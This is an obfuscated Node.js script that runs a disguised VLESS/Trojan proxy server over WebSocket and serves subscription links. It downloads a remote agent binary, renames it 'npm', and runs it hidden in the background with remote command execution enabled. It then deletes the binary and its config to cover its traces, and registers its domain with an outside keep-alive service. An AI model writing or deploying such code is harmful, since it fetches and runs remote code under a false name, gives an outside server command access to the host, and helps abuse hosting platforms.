const _0x247a51=_0x31d3;(function(_0x291c47,_0x431978){const _0x262d0c=_0x31d3,_0x2c16fc=_0x291c47();while(!![]){try{const _0x366e9d=-parseInt(_0x262d0c(0x1e8))/0x1+parseInt(_0x262d0c(0x215))/0x2*(parseInt(_0x262d0c(0x245))/0x3)+-parseInt(_0x262d0c(0x243))/0x4*(parseInt(_0x262d0c(0x1f5))/0x5)+parseInt(_0x262d0c(0x22c))/0x6+-parseInt(_0x262d0c(0x21c))/0x7+parseInt(_0x262d0c(0x24e))/0x8*(parseInt(_0x262d0c(0x24d))/0x9)+-parseInt(_0x262d0c(0x212))/0xa*(-parseInt(_0x262d0c(0x230))/0xb);if(_0x366e9d===_0x431978)break;else _0x2c16fc['push'](_0x2c16fc['shift']());}catch(_0x4963f5){_0x2c16fc['push'](_0x2c16fc['shift']());}}}(_0x51a2,0xd5fae));const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0x247a51(0x260)),net=require(_0x247a51(0x23a)),path=require(_0x247a51(0x20f)),crypto=require(_0x247a51(0x229)),{Buffer}=require(_0x247a51(0x251)),{exec,execSync}=require(_0x247a51(0x20b)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x247a51(0x24b)]['UUID']||_0x247a51(0x23f),NEZHA_SERVER=process[_0x247a51(0x24b)][_0x247a51(0x238)]||'',NEZHA_PORT=process[_0x247a51(0x24b)][_0x247a51(0x1f9)]||'',NEZHA_KEY=process['env'][_0x247a51(0x239)]||'',DOMAIN=process[_0x247a51(0x24b)]['DOMAIN']||_0x247a51(0x235),AUTO_ACCESS=process[_0x247a51(0x24b)][_0x247a51(0x20a)]||!![],WSPATH=process[_0x247a51(0x24b)][_0x247a51(0x1f0)]||UUID[_0x247a51(0x20e)](0x0,0x8),SUB_PATH=process['env'][_0x247a51(0x247)]||_0x247a51(0x1ed),NAME=process[_0x247a51(0x24b)][_0x247a51(0x240)]||'hug',PORT=process['env'][_0x247a51(0x208)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x58dfa0=_0x247a51;try{const _0x1381f6=await axios[_0x58dfa0(0x254)](_0x58dfa0(0x23e)),_0x578668=_0x1381f6['data'];ISP=(_0x578668[_0x58dfa0(0x257)]+'-'+_0x578668[_0x58dfa0(0x1ec)])[_0x58dfa0(0x25b)](/ /g,'_');}catch(_0xdf567d){ISP=_0x58dfa0(0x25a);}};GetISP();const httpServer=http['createServer']((_0x27e1f6,_0x11b52b)=>{const _0x5e4f95=_0x247a51;if(_0x27e1f6[_0x5e4f95(0x253)]==='/'){const _0x570960=path['join'](__dirname,_0x5e4f95(0x1e9));fs['readFile'](_0x570960,_0x5e4f95(0x1e7),(_0x443f86,_0x40b931)=>{const _0x58b8d4=_0x5e4f95;if(_0x443f86){_0x11b52b['writeHead'](0xc8,{'Content-Type':_0x58b8d4(0x1fa)}),_0x11b52b[_0x58b8d4(0x226)](_0x58b8d4(0x205));return;}_0x11b52b[_0x58b8d4(0x21d)](0xc8,{'Content-Type':_0x58b8d4(0x1fa)}),_0x11b52b[_0x58b8d4(0x226)](_0x40b931);});return;}else{if(_0x27e1f6['url']==='/'+SUB_PATH){const _0x880fae=NAME?NAME+'-'+ISP:ISP,_0x29f47e='vless://'+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+_0x5e4f95(0x20d)+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x880fae,_0x5dc2d0=_0x5e4f95(0x234)+UUID+'@'+DOMAIN+_0x5e4f95(0x241)+DOMAIN+_0x5e4f95(0x20d)+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x880fae,_0xef7d2e=_0x29f47e+'\x0a'+_0x5dc2d0,_0x2b339a=Buffer[_0x5e4f95(0x25c)](_0xef7d2e)[_0x5e4f95(0x24a)]('base64');_0x11b52b[_0x5e4f95(0x21d)](0xc8,{'Content-Type':'text/plain'}),_0x11b52b[_0x5e4f95(0x226)](_0x2b339a+'\x0a');}else _0x11b52b[_0x5e4f95(0x21d)](0x194,{'Content-Type':_0x5e4f95(0x1ea)}),_0x11b52b[_0x5e4f95(0x226)](_0x5e4f95(0x1ff));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x247a51(0x25b)](/-/g,''),DNS_SERVERS=[_0x247a51(0x1f4),_0x247a51(0x206)];function resolveHost(_0x51d780){return new Promise((_0x4fed03,_0xb3e082)=>{const _0x5b1393=_0x31d3;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x5b1393(0x250)](_0x51d780)){_0x4fed03(_0x51d780);return;}let _0x250a66=0x0;function _0x3ff6c5(){const _0x272214=_0x5b1393;if(_0x250a66>=DNS_SERVERS[_0x272214(0x1f7)]){_0xb3e082(new Error(_0x272214(0x20c)+_0x51d780+_0x272214(0x233)));return;}const _0x1880a6=DNS_SERVERS[_0x250a66];_0x250a66++;const _0x5ca6ab='https://dns.google/resolve?name='+encodeURIComponent(_0x51d780)+'&type=A';axios[_0x272214(0x254)](_0x5ca6ab,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x272214(0x23d)](_0x2fd1ca=>{const _0x55e43c=_0x272214,_0x1af434=_0x2fd1ca['data'];if(_0x1af434[_0x55e43c(0x217)]===0x0&&_0x1af434[_0x55e43c(0x1f6)]&&_0x1af434[_0x55e43c(0x1f6)][_0x55e43c(0x1f7)]>0x0){const _0x1d65cd=_0x1af434[_0x55e43c(0x1f6)][_0x55e43c(0x1f8)](_0x3c6153=>_0x3c6153[_0x55e43c(0x213)]===0x1);if(_0x1d65cd){_0x4fed03(_0x1d65cd['data']);return;}}_0x3ff6c5();})[_0x272214(0x25d)](_0x8d5f65=>{_0x3ff6c5();});}_0x3ff6c5();});}function handleVlessConnection(_0x7f87c2,_0x5a9f37){const _0x2950e6=_0x247a51,[_0x37870b]=_0x5a9f37,_0x50e600=_0x5a9f37[_0x2950e6(0x20e)](0x1,0x11);if(!_0x50e600['every']((_0x11d288,_0x47d116)=>_0x11d288==parseInt(uuid[_0x2950e6(0x237)](_0x47d116*0x2,0x2),0x10)))return![];let _0x1bb522=_0x5a9f37[_0x2950e6(0x20e)](0x11,0x12)['readUInt8']()+0x13;const _0x58ea7b=_0x5a9f37[_0x2950e6(0x20e)](_0x1bb522,_0x1bb522+=0x2)['readUInt16BE'](0x0),_0x9e03c6=_0x5a9f37[_0x2950e6(0x20e)](_0x1bb522,_0x1bb522+=0x1)[_0x2950e6(0x21b)](),_0x3e9a73=_0x9e03c6==0x1?_0x5a9f37[_0x2950e6(0x20e)](_0x1bb522,_0x1bb522+=0x4)[_0x2950e6(0x232)]('.'):_0x9e03c6==0x2?new TextDecoder()[_0x2950e6(0x244)](_0x5a9f37[_0x2950e6(0x20e)](_0x1bb522+0x1,_0x1bb522+=0x1+_0x5a9f37[_0x2950e6(0x20e)](_0x1bb522,_0x1bb522+0x1)[_0x2950e6(0x21b)]())):_0x9e03c6==0x3?_0x5a9f37[_0x2950e6(0x20e)](_0x1bb522,_0x1bb522+=0x10)['reduce']((_0x57996c,_0x278d37,_0x469c10,_0x5a3b55)=>_0x469c10%0x2?_0x57996c['concat'](_0x5a3b55[_0x2950e6(0x20e)](_0x469c10-0x1,_0x469c10+0x1)):_0x57996c,[])[_0x2950e6(0x1f3)](_0xe5d471=>_0xe5d471[_0x2950e6(0x22a)](0x0)[_0x2950e6(0x24a)](0x10))[_0x2950e6(0x232)](':'):'';_0x7f87c2[_0x2950e6(0x236)](new Uint8Array([_0x37870b,0x0]));const _0x5c1c9d=createWebSocketStream(_0x7f87c2);return resolveHost(_0x3e9a73)[_0x2950e6(0x23d)](_0x59d1e2=>{net['connect']({'host':_0x59d1e2,'port':_0x58ea7b},function(){const _0x4d5f6b=_0x31d3;this[_0x4d5f6b(0x258)](_0x5a9f37[_0x4d5f6b(0x20e)](_0x1bb522)),_0x5c1c9d['on'](_0x4d5f6b(0x225),()=>{})[_0x4d5f6b(0x224)](this)['on'](_0x4d5f6b(0x225),()=>{})['pipe'](_0x5c1c9d);})['on']('error',()=>{});})[_0x2950e6(0x25d)](_0x4afeb1=>{const _0xe7786d=_0x2950e6;net[_0xe7786d(0x204)]({'host':_0x3e9a73,'port':_0x58ea7b},function(){const _0x51e1e6=_0xe7786d;this[_0x51e1e6(0x258)](_0x5a9f37[_0x51e1e6(0x20e)](_0x1bb522)),_0x5c1c9d['on'](_0x51e1e6(0x225),()=>{})[_0x51e1e6(0x224)](this)['on']('error',()=>{})['pipe'](_0x5c1c9d);})['on'](_0xe7786d(0x225),()=>{});}),!![];}function handleTrojanConnection(_0x3551f6,_0x110b11){const _0xa80440=_0x247a51;try{if(_0x110b11[_0xa80440(0x1f7)]<0x3a)return![];const _0x182c2d=_0x110b11[_0xa80440(0x20e)](0x0,0x38)[_0xa80440(0x24a)](),_0x393ef8=[UUID];let _0x269b47=null;for(const _0x52c17c of _0x393ef8){const _0x170277=crypto[_0xa80440(0x242)]('sha224')[_0xa80440(0x209)](_0x52c17c)[_0xa80440(0x22b)](_0xa80440(0x201));if(_0x170277===_0x182c2d){_0x269b47=_0x52c17c;break;}}if(!_0x269b47)return![];let _0xf03d05=0x38;_0x110b11[_0xf03d05]===0xd&&_0x110b11[_0xf03d05+0x1]===0xa&&(_0xf03d05+=0x2);const _0x44e134=_0x110b11[_0xf03d05];if(_0x44e134!==0x1)return![];_0xf03d05+=0x1;const _0x564080=_0x110b11[_0xf03d05];_0xf03d05+=0x1;let _0x1dde1f,_0x176bfb;if(_0x564080===0x1)_0x1dde1f=_0x110b11[_0xa80440(0x20e)](_0xf03d05,_0xf03d05+0x4)[_0xa80440(0x232)]('.'),_0xf03d05+=0x4;else{if(_0x564080===0x3){const _0x81a5b=_0x110b11[_0xf03d05];_0xf03d05+=0x1,_0x1dde1f=_0x110b11['slice'](_0xf03d05,_0xf03d05+_0x81a5b)[_0xa80440(0x24a)](),_0xf03d05+=_0x81a5b;}else{if(_0x564080===0x4)_0x1dde1f=_0x110b11[_0xa80440(0x20e)](_0xf03d05,_0xf03d05+0x10)[_0xa80440(0x227)]((_0x3e4228,_0x403423,_0x4e6138,_0x33a116)=>_0x4e6138%0x2?_0x3e4228[_0xa80440(0x252)](_0x33a116[_0xa80440(0x20e)](_0x4e6138-0x1,_0x4e6138+0x1)):_0x3e4228,[])[_0xa80440(0x1f3)](_0x192148=>_0x192148[_0xa80440(0x22a)](0x0)[_0xa80440(0x24a)](0x10))['join'](':'),_0xf03d05+=0x10;else return![];}}_0x176bfb=_0x110b11['readUInt16BE'](_0xf03d05),_0xf03d05+=0x2;_0xf03d05<_0x110b11[_0xa80440(0x1f7)]&&_0x110b11[_0xf03d05]===0xd&&_0x110b11[_0xf03d05+0x1]===0xa&&(_0xf03d05+=0x2);const _0x5dd5ff=createWebSocketStream(_0x3551f6);return resolveHost(_0x1dde1f)['then'](_0x3baef1=>{const _0x2d4974=_0xa80440;net[_0x2d4974(0x204)]({'host':_0x3baef1,'port':_0x176bfb},function(){const _0x12c7b7=_0x2d4974;_0xf03d05<_0x110b11[_0x12c7b7(0x1f7)]&&this[_0x12c7b7(0x258)](_0x110b11[_0x12c7b7(0x20e)](_0xf03d05)),_0x5dd5ff['on']('error',()=>{})[_0x12c7b7(0x224)](this)['on'](_0x12c7b7(0x225),()=>{})[_0x12c7b7(0x224)](_0x5dd5ff);})['on'](_0x2d4974(0x225),()=>{});})[_0xa80440(0x25d)](_0x39c800=>{net['connect']({'host':_0x1dde1f,'port':_0x176bfb},function(){const _0x208757=_0x31d3;_0xf03d05<_0x110b11[_0x208757(0x1f7)]&&this['write'](_0x110b11['slice'](_0xf03d05)),_0x5dd5ff['on']('error',()=>{})[_0x208757(0x224)](this)['on']('error',()=>{})[_0x208757(0x224)](_0x5dd5ff);})['on']('error',()=>{});}),!![];}catch(_0x1ce1b1){return![];}}function _0x51a2(){const _0x43fe66=['\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','connect','Hello\x20world!','1.1.1.1','https://arm64.ssss.nyc.mn/v1','PORT','update','AUTO_ACCESS','child_process','Failed\x20to\x20resolve\x20','&fp=chrome&type=ws&host=','slice','path','https://arm64.ssss.nyc.mn/agent','Automatic\x20Access\x20Task\x20added\x20successfully','54450GCRdou','type','2087','442276kTBgtp','unlink','Status','setsid\x20nohup\x20./npm\x20-s\x20','log','arch','readUInt8','4145190uNKLqV','writeHead','\x20-p\x20','message','/bin/bash','https://amd64.ssss.nyc.mn/agent','https://oooo.serv00.net/add-url','pop','pipe','error','end','reduce','application/json','crypto','readUInt16BE','digest','8078928fAPuro','close','npm','utf-8','1507EJSpjh','post','join','\x20with\x20all\x20DNS\x20servers','trojan://','1234.abc.com','send','substr','NEZHA_SERVER','NEZHA_KEY','net','https://amd64.ssss.nyc.mn/v1','connection','then','https://api.ip.sb/geoip','b40f88bb-48ec-41f1-8ef5-6acd726a75eb','NAME',':443?security=tls&sni=','createHash','231688zJJivs','decode','12ZWhSfF','npm\x20is\x20already\x20running,\x20skip\x20running...','SUB_PATH','true','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','toString','env','error:\x20','12303ioMOAD','4808OTVSHC','config.yaml','test','buffer','concat','url','get','includes','arm','country_code','write','npm\x20is\x20running','Unknown','replace','from','catch','every','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','axios','Server\x20is\x20running\x20on\x20port\x20','client_secret:\x20','utf8','939812SIajlE','index.html','text/plain','createWriteStream','isp','sub','chmod\x20+x\x20npm','trim','WSPATH','443','2096','map','8.8.4.4','120qMqgLU','Answer','length','find','NEZHA_PORT','text/html','2053','8443','2083','https://','Not\x20Found\x0a','data','hex','npm\x20download\x20successfully'];_0x51a2=function(){return _0x43fe66;};return _0x51a2();}wss['on'](_0x247a51(0x23c),(_0x510ad9,_0x308631)=>{const _0x11b11d=_0x247a51,_0x26df60=_0x308631[_0x11b11d(0x253)]||'';_0x510ad9['once'](_0x11b11d(0x21f),_0x2780c8=>{const _0x255da2=_0x11b11d;if(_0x2780c8[_0x255da2(0x1f7)]>0x11&&_0x2780c8[0x0]===0x0){const _0x4e1c39=_0x2780c8[_0x255da2(0x20e)](0x1,0x11),_0x487b39=_0x4e1c39[_0x255da2(0x25e)]((_0x23ca4e,_0x1e235f)=>_0x23ca4e==parseInt(uuid[_0x255da2(0x237)](_0x1e235f*0x2,0x2),0x10));if(_0x487b39){!handleVlessConnection(_0x510ad9,_0x2780c8)&&_0x510ad9['close']();return;}}!handleTrojanConnection(_0x510ad9,_0x2780c8)&&_0x510ad9[_0x255da2(0x22d)]();})['on']('error',()=>{});});function _0x31d3(_0x53ddbc,_0x4e9896){_0x53ddbc=_0x53ddbc-0x1e5;const _0x51a266=_0x51a2();let _0x31d37d=_0x51a266[_0x53ddbc];return _0x31d37d;}const getDownloadUrl=()=>{const _0x6cb6c5=_0x247a51,_0x1e893a=os[_0x6cb6c5(0x21a)]();return _0x1e893a===_0x6cb6c5(0x256)||_0x1e893a==='arm64'||_0x1e893a==='aarch64'?!NEZHA_PORT?_0x6cb6c5(0x207):_0x6cb6c5(0x210):!NEZHA_PORT?_0x6cb6c5(0x23b):_0x6cb6c5(0x221);},downloadFile=async()=>{const _0x6950c5=_0x247a51;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x153856=getDownloadUrl(),_0x149f82=await axios({'method':_0x6950c5(0x254),'url':_0x153856,'responseType':'stream'}),_0x2b88ba=fs[_0x6950c5(0x1eb)](_0x6950c5(0x22e));return _0x149f82[_0x6950c5(0x200)][_0x6950c5(0x224)](_0x2b88ba),new Promise((_0x26488d,_0x40b4fe)=>{const _0x2f544e=_0x6950c5;_0x2b88ba['on']('finish',()=>{const _0x1f1e76=_0x31d3;console[_0x1f1e76(0x219)](_0x1f1e76(0x202)),exec(_0x1f1e76(0x1ee),_0x5bcc45=>{if(_0x5bcc45)_0x40b4fe(_0x5bcc45);_0x26488d();});}),_0x2b88ba['on'](_0x2f544e(0x225),_0x40b4fe);});}catch(_0xcdd121){throw _0xcdd121;}},runnz=async()=>{const _0x47731b=_0x247a51;try{const _0x317d7c=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x47731b(0x22f)});if(_0x317d7c[_0x47731b(0x1ef)]()!==''){console[_0x47731b(0x219)](_0x47731b(0x246));return;}}catch(_0x3e7767){}await downloadFile();let _0x1d4ef3='',_0x2d2fbb=[_0x47731b(0x1f1),_0x47731b(0x1fc),_0x47731b(0x1f2),_0x47731b(0x214),_0x47731b(0x1fd),_0x47731b(0x1fb)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x366604=_0x2d2fbb[_0x47731b(0x255)](NEZHA_PORT)?'--tls':'';_0x1d4ef3=_0x47731b(0x218)+NEZHA_SERVER+':'+NEZHA_PORT+_0x47731b(0x21e)+NEZHA_KEY+'\x20'+_0x366604+_0x47731b(0x249);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x54e391=NEZHA_SERVER[_0x47731b(0x255)](':')?NEZHA_SERVER['split'](':')[_0x47731b(0x223)]():'',_0x16d019=_0x2d2fbb[_0x47731b(0x255)](_0x54e391)?_0x47731b(0x248):'false',_0x542c7d=_0x47731b(0x1e6)+NEZHA_KEY+_0x47731b(0x25f)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x16d019+_0x47731b(0x203)+UUID;fs['writeFileSync']('config.yaml',_0x542c7d);}_0x1d4ef3='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console[_0x47731b(0x219)]('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x1d4ef3,{'shell':_0x47731b(0x220)},_0x5e7514=>{const _0x3d07d0=_0x47731b;if(_0x5e7514)console['error']('npm\x20running\x20error:',_0x5e7514);else console[_0x3d07d0(0x219)](_0x3d07d0(0x259));});}catch(_0x6fd7f2){console[_0x47731b(0x225)](_0x47731b(0x24c)+_0x6fd7f2);}};async function addAccessTask(){const _0x50f78a=_0x247a51;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x17ce57=_0x50f78a(0x1fe)+DOMAIN;try{const _0x545459=await axios[_0x50f78a(0x231)](_0x50f78a(0x222),{'url':_0x17ce57},{'headers':{'Content-Type':_0x50f78a(0x228)}});console['log'](_0x50f78a(0x211));}catch(_0x3c1e70){}}const delFiles=()=>{const _0x35156f=_0x247a51;fs[_0x35156f(0x216)]('npm',()=>{}),fs[_0x35156f(0x216)](_0x35156f(0x24f),()=>{});};httpServer['listen'](PORT,()=>{const _0xe4d8a1=_0x247a51;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0xe4d8a1(0x219)](_0xe4d8a1(0x1e5)+PORT);});
